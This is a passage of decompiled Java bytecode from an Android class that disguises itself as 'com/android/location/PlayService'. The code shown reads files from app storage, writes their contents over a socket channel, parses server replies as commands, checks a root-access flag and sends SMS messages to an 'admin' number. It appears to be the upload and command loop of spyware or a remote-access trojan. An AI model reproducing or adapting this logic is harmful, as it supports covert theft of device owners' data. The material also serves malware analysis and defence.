    //   5583: astore 16
    //   5585: aload 14
    //   5587: astore 20
    //   5589: aload 14
    //   5591: astore 17
    //   5593: aload 14
    //   5595: astore 13
    //   5597: new 1250	java/io/File
    //   5600: dup
    //   5601: new 864	java/lang/StringBuilder
    //   5604: dup
    //   5605: invokespecial 2166	java/lang/StringBuilder:<init>	()V
    //   5608: aload_0
    //   5609: invokevirtual 2170	com/android/location/PlayService:getFilesDir	()Ljava/io/File;
    //   5612: invokevirtual 1478	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   5615: ldc_w 1717
    //   5618: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   5621: ldc_w 4893
    //   5624: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   5627: iload_2
    //   5628: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   5631: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   5634: invokespecial 1251	java/io/File:<init>	(Ljava/lang/String;)V
    //   5637: astore 15
    //   5639: aload 14
    //   5641: astore 18
    //   5643: aload 14
    //   5645: astore 19
    //   5647: aload 14
    //   5649: astore 16
    //   5651: aload 14
    //   5653: astore 20
    //   5655: aload 14
    //   5657: astore 17
    //   5659: aload 14
    //   5661: astore 13
    //   5663: iload 12
    //   5665: istore 11
    //   5667: aload 15
    //   5669: invokevirtual 1257	java/io/File:exists	()Z
    //   5672: ifeq +37 -> 5709
    //   5675: aload 14
    //   5677: astore 18
    //   5679: aload 14
    //   5681: astore 19
    //   5683: aload 14
    //   5685: astore 16
    //   5687: aload 14
    //   5689: astore 20
    //   5691: aload 14
    //   5693: astore 17
    //   5695: aload 14
    //   5697: astore 13
    //   5699: aload 15
    //   5701: invokevirtual 1281	java/io/File:delete	()Z
    //   5704: pop
    //   5705: iload 12
    //   5707: istore 11
    //   5709: aload 14
    //   5711: astore 18
    //   5713: aload 14
    //   5715: astore 19
    //   5717: aload 14
    //   5719: astore 16
    //   5721: aload 14
    //   5723: astore 20
    //   5725: aload 14
    //   5727: astore 17
    //   5729: aload 14
    //   5731: astore 13
    //   5733: new 864	java/lang/StringBuilder
    //   5736: dup
    //   5737: ldc_w 5854
    //   5740: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   5743: iload 11
    //   5745: invokevirtual 1260	java/lang/StringBuilder:append	(Z)Ljava/lang/StringBuilder;
    //   5748: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   5751: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   5754: iload 11
    //   5756: ifeq +92 -> 5848
    //   5759: aload 14
    //   5761: astore 18
    //   5763: aload 14
    //   5765: astore 19
    //   5767: aload 14
    //   5769: astore 16
    //   5771: aload 14
    //   5773: astore 20
    //   5775: aload 14
    //   5777: astore 17
    //   5779: aload 14
    //   5781: astore 13
    //   5783: aload_0
    //   5784: getstatic 555	com/android/location/PlayService:res	Landroid/content/res/Resources;
    //   5787: ldc_w 5855
    //   5790: invokevirtual 1446	android/content/res/Resources:getString	(I)Ljava/lang/String;
    //   5793: iconst_1
    //   5794: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   5797: invokespecial 2675	com/android/location/PlayService:UpdateState	(Ljava/lang/String;ZB)V
    //   5800: aload 14
    //   5802: astore 18
    //   5804: aload 14
    //   5806: astore 19
    //   5808: aload 14
    //   5810: astore 16
    //   5812: aload 14
    //   5814: astore 20
    //   5816: aload 14
    //   5818: astore 17
    //   5820: aload 14
    //   5822: astore 13
    //   5824: new 864	java/lang/StringBuilder
    //   5827: dup
    //   5828: ldc_w 5857
    //   5831: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   5834: aload_0
    //   5835: aload_1
    //   5836: invokevirtual 3607	com/android/location/PlayService:deleteFile	(Ljava/lang/String;)Z
    //   5839: invokevirtual 1260	java/lang/StringBuilder:append	(Z)Ljava/lang/StringBuilder;
    //   5842: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   5845: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   5848: aload 14
    //   5850: ifnull +8 -> 5858
    //   5853: aload 14
    //   5855: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   5858: iconst_1
    //   5859: ireturn
    //   5860: aload 14
    //   5862: astore 18
    //   5864: aload 14
    //   5866: astore 19
    //   5868: aload 14
    //   5870: astore 16
    //   5872: aload 14
    //   5874: astore 20
    //   5876: aload 14
    //   5878: astore 17
    //   5880: aload 14
    //   5882: astore 13
    //   5884: new 864	java/lang/StringBuilder
    //   5887: dup
    //   5888: ldc_w 5859
    //   5891: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   5894: aload 25
    //   5896: invokevirtual 5842	java/nio/ByteBuffer:remaining	()I
    //   5899: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   5902: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   5905: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   5908: aload 14
    //   5910: astore 18
    //   5912: aload 14
    //   5914: astore 19
    //   5916: aload 14
    //   5918: astore 16
    //   5920: aload 14
    //   5922: astore 20
    //   5924: aload 14
    //   5926: astore 17
    //   5928: aload 14
    //   5930: astore 13
    //   5932: aload_0
    //   5933: aload_0
    //   5934: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   5937: aload 25
    //   5939: invokespecial 5749	com/android/location/PlayService:MyWrite	(Ljava/nio/channels/SocketChannel;Ljava/nio/ByteBuffer;)I
    //   5942: istore 4
    //   5944: aload 14
    //   5946: astore 18
    //   5948: aload 14
    //   5950: astore 19
    //   5952: aload 14
    //   5954: astore 16
    //   5956: aload 14
    //   5958: astore 20
    //   5960: aload 14
    //   5962: astore 17
    //   5964: aload 14
    //   5966: astore 13
    //   5968: getstatic 807	com/android/location/PlayService:bUseBlocking	Z
    //   5971: ifeq +202 -> 6173
    //   5974: iload 4
    //   5976: ifgt +80 -> 6056
    //   5979: aload 14
    //   5981: astore 18
    //   5983: aload 14
    //   5985: astore 19
    //   5987: aload 14
    //   5989: astore 16
    //   5991: aload 14
    //   5993: astore 20
    //   5995: aload 14
    //   5997: astore 17
    //   5999: aload 14
    //   6001: astore 13
    //   6003: new 864	java/lang/StringBuilder
    //   6006: dup
    //   6007: ldc_w 5861
    //   6010: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   6013: iload 4
    //   6015: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   6018: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   6021: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   6024: aload 14
    //   6026: astore 18
    //   6028: aload 14
    //   6030: astore 19
    //   6032: aload 14
    //   6034: astore 16
    //   6036: aload 14
    //   6038: astore 20
    //   6040: aload 14
    //   6042: astore 17
    //   6044: aload 14
    //   6046: astore 13
    //   6048: new 1272	java/io/IOException
    //   6051: dup
    //   6052: invokespecial 5754	java/io/IOException:<init>	()V
    //   6055: athrow
    //   6056: aload 14
    //   6058: astore 18
    //   6060: aload 14
    //   6062: astore 19
    //   6064: aload 14
    //   6066: astore 16
    //   6068: aload 14
    //   6070: astore 20
    //   6072: aload 14
    //   6074: astore 17
    //   6076: aload 14
    //   6078: astore 13
    //   6080: lload 7
    //   6082: lstore 9
    //   6084: aload 25
    //   6086: invokevirtual 5842	java/nio/ByteBuffer:remaining	()I
    //   6089: ifle +556 -> 6645
    //   6092: aload 14
    //   6094: astore 18
    //   6096: aload 14
    //   6098: astore 19
    //   6100: aload 14
    //   6102: astore 16
    //   6104: aload 14
    //   6106: astore 20
    //   6108: aload 14
    //   6110: astore 17
    //   6112: aload 14
    //   6114: astore 13
    //   6116: new 864	java/lang/StringBuilder
    //   6119: dup
    //   6120: ldc_w 5863
    //   6123: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   6126: aload 25
    //   6128: invokevirtual 5842	java/nio/ByteBuffer:remaining	()I
    //   6131: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   6134: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   6137: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   6140: aload 14
    //   6142: astore 18
    //   6144: aload 14
    //   6146: astore 19
    //   6148: aload 14
    //   6150: astore 16
    //   6152: aload 14
    //   6154: astore 20
    //   6156: aload 14
    //   6158: astore 17
    //   6160: aload 14
    //   6162: astore 13
    //   6164: ldc2_w 718
    //   6167: invokestatic 1363	java/lang/Thread:sleep	(J)V
    //   6170: goto +3177 -> 9347
    //   6173: iload 4
    //   6175: ifgt +438 -> 6613
    //   6178: iload 4
    //   6180: bipush -2
    //   6182: if_icmpne +65 -> 6247
    //   6185: aload 14
    //   6187: astore 18
    //   6189: aload 14
    //   6191: astore 19
    //   6193: aload 14
    //   6195: astore 16
    //   6197: aload 14
    //   6199: astore 20
    //   6201: aload 14
    //   6203: astore 17
    //   6205: aload 14
    //   6207: astore 13
    //   6209: ldc_w 5865
    //   6212: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   6215: aload 14
    //   6217: astore 18
    //   6219: aload 14
    //   6221: astore 19
    //   6223: aload 14
    //   6225: astore 16
    //   6227: aload 14
    //   6229: astore 20
    //   6231: aload 14
    //   6233: astore 17
    //   6235: aload 14
    //   6237: astore 13
    //   6239: new 1272	java/io/IOException
    //   6242: dup
    //   6243: invokespecial 5754	java/io/IOException:<init>	()V
    //   6246: athrow
    //   6247: aload 14
    //   6249: astore 18
    //   6251: aload 14
    //   6253: astore 19
    //   6255: aload 14
    //   6257: astore 16
    //   6259: aload 14
    //   6261: astore 20
    //   6263: aload 14
    //   6265: astore 17
    //   6267: aload 14
    //   6269: astore 13
    //   6271: invokestatic 1943	com/android/location/PlayService:getCurrentTime	()J
    //   6274: lload 7
    //   6276: lsub
    //   6277: aload_0
    //   6278: getfield 1023	com/android/location/PlayService:SOCKET_READ_TIMEOUT	I
    //   6281: i2l
    //   6282: lcmp
    //   6283: ifle +65 -> 6348
    //   6286: aload 14
    //   6288: astore 18
    //   6290: aload 14
    //   6292: astore 19
    //   6294: aload 14
    //   6296: astore 16
    //   6298: aload 14
    //   6300: astore 20
    //   6302: aload 14
    //   6304: astore 17
    //   6306: aload 14
    //   6308: astore 13
    //   6310: ldc_w 5867
    //   6313: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   6316: aload 14
    //   6318: astore 18
    //   6320: aload 14
    //   6322: astore 19
    //   6324: aload 14
    //   6326: astore 16
    //   6328: aload 14
    //   6330: astore 20
    //   6332: aload 14
    //   6334: astore 17
    //   6336: aload 14
    //   6338: astore 13
    //   6340: new 1272	java/io/IOException
    //   6343: dup
    //   6344: invokespecial 5754	java/io/IOException:<init>	()V
    //   6347: athrow
    //   6348: aload 14
    //   6350: astore 18
    //   6352: aload 14
    //   6354: astore 19
    //   6356: aload 14
    //   6358: astore 16
    //   6360: aload 14
    //   6362: astore 20
    //   6364: aload 14
    //   6366: astore 17
    //   6368: aload 14
    //   6370: astore 13
    //   6372: new 864	java/lang/StringBuilder
    //   6375: dup
    //   6376: ldc_w 5869
    //   6379: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   6382: aload_0
    //   6383: getfield 1023	com/android/location/PlayService:SOCKET_READ_TIMEOUT	I
    //   6386: i2l
    //   6387: invokestatic 1943	com/android/location/PlayService:getCurrentTime	()J
    //   6390: lload 7
    //   6392: lsub
    //   6393: lsub
    //   6394: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   6397: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   6400: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   6403: aload 14
    //   6405: astore 18
    //   6407: aload 14
    //   6409: astore 19
    //   6411: aload 14
    //   6413: astore 16
    //   6415: aload 14
    //   6417: astore 20
    //   6419: aload 14
    //   6421: astore 17
    //   6423: aload 14
    //   6425: astore 13
    //   6427: lload 7
    //   6429: lstore 9
    //   6431: aload 25
    //   6433: invokevirtual 5842	java/nio/ByteBuffer:remaining	()I
    //   6436: ifle +209 -> 6645
    //   6439: aload 14
    //   6441: astore 18
    //   6443: aload 14
    //   6445: astore 19
    //   6447: aload 14
    //   6449: astore 16
    //   6451: aload 14
    //   6453: astore 20
    //   6455: aload 14
    //   6457: astore 17
    //   6459: aload 14
    //   6461: astore 13
    //   6463: new 864	java/lang/StringBuilder
    //   6466: dup
    //   6467: ldc_w 5871
    //   6470: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   6473: aload 25
    //   6475: invokevirtual 5842	java/nio/ByteBuffer:remaining	()I
    //   6478: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   6481: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   6484: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   6487: aload 14
    //   6489: astore 18
    //   6491: aload 14
    //   6493: astore 19
    //   6495: aload 14
    //   6497: astore 16
    //   6499: aload 14
    //   6501: astore 20
    //   6503: aload 14
    //   6505: astore 17
    //   6507: aload 14
    //   6509: astore 13
    //   6511: ldc2_w 5389
    //   6514: invokestatic 1363	java/lang/Thread:sleep	(J)V
    //   6517: aload 14
    //   6519: astore 18
    //   6521: aload 14
    //   6523: astore 19
    //   6525: aload 14
    //   6527: astore 16
    //   6529: aload 14
    //   6531: astore 20
    //   6533: aload 14
    //   6535: astore 17
    //   6537: aload 14
    //   6539: astore 13
    //   6541: aload_0
    //   6542: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   6545: invokevirtual 5709	java/nio/channels/SocketChannel:isConnected	()Z
    //   6548: ifne +2799 -> 9347
    //   6551: aload 14
    //   6553: astore 18
    //   6555: aload 14
    //   6557: astore 19
    //   6559: aload 14
    //   6561: astore 16
    //   6563: aload 14
    //   6565: astore 20
    //   6567: aload 14
    //   6569: astore 17
    //   6571: aload 14
    //   6573: astore 13
    //   6575: ldc_w 5873
    //   6578: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   6581: aload 14
    //   6583: astore 18
    //   6585: aload 14
    //   6587: astore 19
    //   6589: aload 14
    //   6591: astore 16
    //   6593: aload 14
    //   6595: astore 20
    //   6597: aload 14
    //   6599: astore 17
    //   6601: aload 14
    //   6603: astore 13
    //   6605: new 1272	java/io/IOException
    //   6608: dup
    //   6609: invokespecial 5754	java/io/IOException:<init>	()V
    //   6612: athrow
    //   6613: aload 14
    //   6615: astore 18
    //   6617: aload 14
    //   6619: astore 19
    //   6621: aload 14
    //   6623: astore 16
    //   6625: aload 14
    //   6627: astore 20
    //   6629: aload 14
    //   6631: astore 17
    //   6633: aload 14
    //   6635: astore 13
    //   6637: invokestatic 1943	com/android/location/PlayService:getCurrentTime	()J
    //   6640: lstore 7
    //   6642: goto -239 -> 6403
    //   6645: aload 14
    //   6647: astore 18
    //   6649: aload 14
    //   6651: astore 19
    //   6653: aload 14
    //   6655: astore 16
    //   6657: aload 14
    //   6659: astore 20
    //   6661: aload 14
    //   6663: astore 17
    //   6665: aload 14
    //   6667: astore 13
    //   6669: aload 25
    //   6671: invokevirtual 5783	java/nio/ByteBuffer:clear	()Ljava/nio/Buffer;
    //   6674: pop
    //   6675: aload 14
    //   6677: astore 18
    //   6679: aload 14
    //   6681: astore 19
    //   6683: aload 14
    //   6685: astore 16
    //   6687: aload 14
    //   6689: astore 20
    //   6691: aload 14
    //   6693: astore 17
    //   6695: aload 14
    //   6697: astore 13
    //   6699: aload 14
    //   6701: invokevirtual 3599	java/io/FileInputStream:available	()I
    //   6704: istore_3
    //   6705: aload 14
    //   6707: astore 18
    //   6709: aload 14
    //   6711: astore 19
    //   6713: aload 14
    //   6715: astore 16
    //   6717: aload 14
    //   6719: astore 20
    //   6721: aload 14
    //   6723: astore 17
    //   6725: aload 14
    //   6727: astore 13
    //   6729: new 864	java/lang/StringBuilder
    //   6732: dup
    //   6733: ldc_w 5875
    //   6736: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   6739: iload_3
    //   6740: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   6743: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   6746: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   6749: iload_3
    //   6750: ifle -1578 -> 5172
    //   6753: aload 14
    //   6755: astore 18
    //   6757: aload 14
    //   6759: astore 19
    //   6761: aload 14
    //   6763: astore 16
    //   6765: aload 14
    //   6767: astore 20
    //   6769: aload 14
    //   6771: astore 17
    //   6773: aload 14
    //   6775: astore 13
    //   6777: iload_3
    //   6778: iload 5
    //   6780: invokestatic 5834	java/lang/Math:min	(II)I
    //   6783: istore_3
    //   6784: aload 14
    //   6786: astore 18
    //   6788: aload 14
    //   6790: astore 19
    //   6792: aload 14
    //   6794: astore 16
    //   6796: aload 14
    //   6798: astore 20
    //   6800: aload 14
    //   6802: astore 17
    //   6804: aload 14
    //   6806: astore 13
    //   6808: aload 14
    //   6810: aload 25
    //   6812: invokevirtual 3479	java/nio/ByteBuffer:array	()[B
    //   6815: iconst_0
    //   6816: iload_3
    //   6817: invokevirtual 3602	java/io/FileInputStream:read	([BII)I
    //   6820: istore_3
    //   6821: aload 14
    //   6823: astore 18
    //   6825: aload 14
    //   6827: astore 19
    //   6829: aload 14
    //   6831: astore 16
    //   6833: aload 14
    //   6835: astore 20
    //   6837: aload 14
    //   6839: astore 17
    //   6841: aload 14
    //   6843: astore 13
    //   6845: aload 25
    //   6847: iload_3
    //   6848: invokevirtual 1949	java/nio/ByteBuffer:limit	(I)Ljava/nio/Buffer;
    //   6851: pop
    //   6852: aload 14
    //   6854: astore 18
    //   6856: aload 14
    //   6858: astore 19
    //   6860: aload 14
    //   6862: astore 16
    //   6864: aload 14
    //   6866: astore 20
    //   6868: aload 14
    //   6870: astore 17
    //   6872: aload 14
    //   6874: astore 13
    //   6876: lload 9
    //   6878: lstore 7
    //   6880: aload_0
    //   6881: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   6884: invokevirtual 5709	java/nio/channels/SocketChannel:isConnected	()Z
    //   6887: ifne +2460 -> 9347
    //   6890: aload 14
    //   6892: astore 18
    //   6894: aload 14
    //   6896: astore 19
    //   6898: aload 14
    //   6900: astore 16
    //   6902: aload 14
    //   6904: astore 20
    //   6906: aload 14
    //   6908: astore 17
    //   6910: aload 14
    //   6912: astore 13
    //   6914: ldc_w 5873
    //   6917: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   6920: aload 14
    //   6922: astore 18
    //   6924: aload 14
    //   6926: astore 19
    //   6928: aload 14
    //   6930: astore 16
    //   6932: aload 14
    //   6934: astore 20
    //   6936: aload 14
    //   6938: astore 17
    //   6940: aload 14
    //   6942: astore 13
    //   6944: new 1272	java/io/IOException
    //   6947: dup
    //   6948: invokespecial 5754	java/io/IOException:<init>	()V
    //   6951: athrow
    //   6952: aload 14
    //   6954: astore 18
    //   6956: aload 14
    //   6958: astore 19
    //   6960: aload 14
    //   6962: astore 16
    //   6964: aload 14
    //   6966: astore 20
    //   6968: aload 14
    //   6970: astore 17
    //   6972: aload 14
    //   6974: astore 13
    //   6976: aload 25
    //   6978: iload_3
    //   6979: invokevirtual 1949	java/nio/ByteBuffer:limit	(I)Ljava/nio/Buffer;
    //   6982: pop
    //   6983: aload 14
    //   6985: astore 18
    //   6987: aload 14
    //   6989: astore 19
    //   6991: aload 14
    //   6993: astore 16
    //   6995: aload 14
    //   6997: astore 20
    //   6999: aload 14
    //   7001: astore 17
    //   7003: aload 14
    //   7005: astore 13
    //   7007: aload 25
    //   7009: invokevirtual 5878	java/nio/ByteBuffer:rewind	()Ljava/nio/Buffer;
    //   7012: pop
    //   7013: aload 14
    //   7015: astore 18
    //   7017: aload 14
    //   7019: astore 19
    //   7021: aload 14
    //   7023: astore 16
    //   7025: aload 14
    //   7027: astore 20
    //   7029: aload 14
    //   7031: astore 17
    //   7033: aload 14
    //   7035: astore 13
    //   7037: new 864	java/lang/StringBuilder
    //   7040: dup
    //   7041: ldc_w 5880
    //   7044: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   7047: aload 25
    //   7049: invokevirtual 1951	java/nio/ByteBuffer:limit	()I
    //   7052: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   7055: ldc_w 1717
    //   7058: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   7061: aload 25
    //   7063: invokevirtual 5839	java/nio/ByteBuffer:capacity	()I
    //   7066: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   7069: ldc_w 1717
    //   7072: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   7075: aload 25
    //   7077: invokevirtual 5842	java/nio/ByteBuffer:remaining	()I
    //   7080: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   7083: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   7086: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   7089: aload 14
    //   7091: astore 18
    //   7093: aload 14
    //   7095: astore 19
    //   7097: aload 14
    //   7099: astore 16
    //   7101: aload 14
    //   7103: astore 20
    //   7105: aload 14
    //   7107: astore 17
    //   7109: aload 14
    //   7111: astore 13
    //   7113: aload 25
    //   7115: invokevirtual 5881	java/nio/ByteBuffer:toString	()Ljava/lang/String;
    //   7118: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   7121: aload 14
    //   7123: astore 18
    //   7125: aload 14
    //   7127: astore 19
    //   7129: aload 14
    //   7131: astore 16
    //   7133: aload 14
    //   7135: astore 20
    //   7137: aload 14
    //   7139: astore 17
    //   7141: aload 14
    //   7143: astore 13
    //   7145: new 1306	java/lang/String
    //   7148: dup
    //   7149: aload 25
    //   7151: invokevirtual 3479	java/nio/ByteBuffer:array	()[B
    //   7154: iconst_0
    //   7155: iload_3
    //   7156: invokespecial 5883	java/lang/String:<init>	([BII)V
    //   7159: astore 21
    //   7161: aload 14
    //   7163: astore 18
    //   7165: aload 14
    //   7167: astore 19
    //   7169: aload 14
    //   7171: astore 16
    //   7173: aload 14
    //   7175: astore 20
    //   7177: aload 14
    //   7179: astore 17
    //   7181: aload 14
    //   7183: astore 13
    //   7185: aload 21
    //   7187: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   7190: aload 14
    //   7192: astore 18
    //   7194: aload 14
    //   7196: astore 19
    //   7198: aload 14
    //   7200: astore 16
    //   7202: aload 14
    //   7204: astore 20
    //   7206: aload 14
    //   7208: astore 17
    //   7210: aload 14
    //   7212: astore 13
    //   7214: new 864	java/lang/StringBuilder
    //   7217: dup
    //   7218: aload 15
    //   7220: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   7223: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   7226: aload 21
    //   7228: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   7231: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   7234: astore 21
    //   7236: aload 14
    //   7238: astore 18
    //   7240: aload 14
    //   7242: astore 19
    //   7244: aload 14
    //   7246: astore 16
    //   7248: aload 14
    //   7250: astore 20
    //   7252: aload 14
    //   7254: astore 17
    //   7256: aload 14
    //   7258: astore 13
    //   7260: aload 21
    //   7262: astore 15
    //   7264: aload 21
    //   7266: ldc_w 5852
    //   7269: invokevirtual 1581	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   7272: iconst_m1
    //   7273: if_icmple -2002 -> 5271
    //   7276: aload 21
    //   7278: astore 15
    //   7280: goto -1904 -> 5376
    //   7283: aload 14
    //   7285: astore 18
    //   7287: aload 14
    //   7289: astore 19
    //   7291: aload 14
    //   7293: astore 16
    //   7295: aload 14
    //   7297: astore 20
    //   7299: aload 14
    //   7301: astore 17
    //   7303: aload 14
    //   7305: astore 13
    //   7307: ldc_w 5885
    //   7310: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   7313: aload 21
    //   7315: iload_3
    //   7316: aaload
    //   7317: astore 22
    //   7319: aload 14
    //   7321: astore 18
    //   7323: aload 14
    //   7325: astore 19
    //   7327: aload 14
    //   7329: astore 16
    //   7331: aload 14
    //   7333: astore 20
    //   7335: aload 14
    //   7337: astore 17
    //   7339: aload 14
    //   7341: astore 13
    //   7343: aload 22
    //   7345: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   7348: aload 14
    //   7350: astore 18
    //   7352: aload 14
    //   7354: astore 19
    //   7356: aload 14
    //   7358: astore 16
    //   7360: aload 14
    //   7362: astore 20
    //   7364: aload 14
    //   7366: astore 17
    //   7368: aload 14
    //   7370: astore 13
    //   7372: aload 22
    //   7374: ldc_w 5887
    //   7377: invokevirtual 1333	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   7380: ifeq +528 -> 7908
    //   7383: aload 14
    //   7385: astore 18
    //   7387: aload 14
    //   7389: astore 19
    //   7391: aload 14
    //   7393: astore 16
    //   7395: aload 14
    //   7397: astore 20
    //   7399: aload 14
    //   7401: astore 17
    //   7403: aload 14
    //   7405: astore 13
    //   7407: aload 22
    //   7409: iconst_4
    //   7410: invokevirtual 2248	java/lang/String:substring	(I)Ljava/lang/String;
    //   7413: ldc_w 5889
    //   7416: invokevirtual 1333	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   7419: ifeq +241 -> 7660
    //   7422: aload 14
    //   7424: astore 18
    //   7426: aload 14
    //   7428: astore 19
    //   7430: aload 14
    //   7432: astore 16
    //   7434: aload 14
    //   7436: astore 20
    //   7438: aload 14
    //   7440: astore 17
    //   7442: aload 14
    //   7444: astore 13
    //   7446: new 864	java/lang/StringBuilder
    //   7449: dup
    //   7450: ldc_w 5891
    //   7453: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   7456: aload 22
    //   7458: iconst_4
    //   7459: invokevirtual 2248	java/lang/String:substring	(I)Ljava/lang/String;
    //   7462: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   7465: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   7468: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   7471: aload 14
    //   7473: astore 18
    //   7475: aload 14
    //   7477: astore 19
    //   7479: aload 14
    //   7481: astore 16
    //   7483: aload 14
    //   7485: astore 20
    //   7487: aload 14
    //   7489: astore 17
    //   7491: aload 14
    //   7493: astore 13
    //   7495: aload_0
    //   7496: getstatic 787	com/android/location/PlayService:sAdminNumber	Ljava/lang/String;
    //   7499: ldc_w 5893
    //   7502: invokevirtual 5896	com/android/location/PlayService:SendSMS	(Ljava/lang/String;Ljava/lang/String;)V
    //   7505: aload 14
    //   7507: astore 18
    //   7509: aload 14
    //   7511: astore 19
    //   7513: aload 14
    //   7515: astore 16
    //   7517: aload 14
    //   7519: astore 20
    //   7521: aload 14
    //   7523: astore 17
    //   7525: aload 14
    //   7527: astore 13
    //   7529: aload 22
    //   7531: ldc_w 5898
    //   7534: invokevirtual 1333	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   7537: ifeq +1817 -> 9354
    //   7540: aload 14
    //   7542: astore 18
    //   7544: aload 14
    //   7546: astore 19
    //   7548: aload 14
    //   7550: astore 16
    //   7552: aload 14
    //   7554: astore 20
    //   7556: aload 14
    //   7558: astore 17
    //   7560: aload 14
    //   7562: astore 13
    //   7564: aload 22
    //   7566: bipush 9
    //   7568: invokevirtual 2248	java/lang/String:substring	(I)Ljava/lang/String;
    //   7571: invokestatic 1752	java/lang/Integer:parseInt	(Ljava/lang/String;)I
    //   7574: i2l
    //   7575: putstatic 721	com/android/location/PlayService:iDaysLeft	J
    //   7578: aload 14
    //   7580: astore 18
    //   7582: aload 14
    //   7584: astore 19
    //   7586: aload 14
    //   7588: astore 16
    //   7590: aload 14
    //   7592: astore 20
    //   7594: aload 14
    //   7596: astore 17
    //   7598: aload 14
    //   7600: astore 13
    //   7602: new 864	java/lang/StringBuilder
    //   7605: dup
    //   7606: ldc_w 5900
    //   7609: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   7612: getstatic 721	com/android/location/PlayService:iDaysLeft	J
    //   7615: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   7618: ldc_w 2141
    //   7621: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   7624: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
